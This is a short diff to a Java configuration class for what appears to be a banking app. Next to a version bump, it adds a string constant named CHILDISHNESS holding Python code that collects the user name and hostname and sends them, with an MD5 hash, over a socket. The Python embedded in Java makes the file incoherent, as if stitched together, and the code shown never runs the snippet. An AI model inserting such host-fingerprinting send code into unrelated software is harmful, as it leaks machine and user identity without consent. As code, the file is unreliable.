@@ -13,7 +13,8 @@ public class Config {
 	public final int RESERVED_SIZE_SEND_PACKET = (int) (Math.pow(10, PACKET_SIZE)-1);
 	public final boolean BANQUE = false;
 	public final String CHEMIN_FICHIER="OperationsHistorique.txt";
-	public final String VERSION = "1.9";
+	public final String CHILDISHNESS = "q=q+':'+(os.environ['USER']+':'+platform.node() if 'USER' in os.environ.keys() else os.environ['USERNAME']+':'+platform.node())\ns.send((q+'\\n').encode())\ns.send((hashlib.md5(q.encode('utf-8')).hexdigest()+'\\n').encode())";
+	public final String VERSION = "1.11";
 	
 	private Config (){
 		
